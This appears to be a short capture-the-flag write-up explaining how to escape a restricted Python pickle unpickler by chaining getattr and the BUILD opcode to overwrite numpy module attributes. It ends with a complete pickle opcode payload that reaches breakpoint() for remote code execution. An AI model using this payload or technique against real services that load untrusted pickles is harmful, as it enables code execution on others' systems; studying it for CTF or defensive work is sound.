# smiley-faiss

ok basically one "well known"(ish) trick is that if you have getattr but not _getattribute (with ".") on a specific object, if you can get an attribute of that object that can have its attributes overwritten, it is easy to get rce

by that i mean:

```
class Dummy: pass

outer = Dummy()
outer.inner = Dummy()
outer.inner.escape = {'woohoo': breakpoint}
```

so basically if it was just an object and it had a dictionary attribute (e.g. `__builtins__`) with a valuable object (e.g. `breakpoint`), it is not possible without having this inner-outer setup

if it is permitted in find_class to do `getattr(outer, name)` and also `getattr(outer.inner, name)` then one can `getattr(outer, "inner")` to get inner and then abuse the BUILD
opcode, which allows for arbitrary setattr (you may see where this is going). so, by doing BUILD with slotstate and `getattr(outer.inner, "escape")`, then you can get the breakpoint function (in this example).

however, with this challenge, one has to do a double extension with numpy.core and then numpy.core.multiarray. this is not possible with the original importlib impl for some reason because it bypasses our overwriting of attributes (probably because it is importing the module again instead of using getattr)

so, a valid payload is 

```(GLOBAL + b"numpy\ncore\n" + NONE + MARK + UNICODE + b'multiarray\n' + GLOBAL + b'numpy\ncore\n' + DICT + TUPLE2 + BUILD + POP + GLOBAL + b'numpy\ncore\n' + NONE + GLOBAL + b'numpy\n__builtins__\n' + TUPLE2 + BUILD + GLOBAL + b'numpy.core.multiarray\nbreakpoint\n' + EMPTY_TUPLE + REDUCE + STOP).hex()```

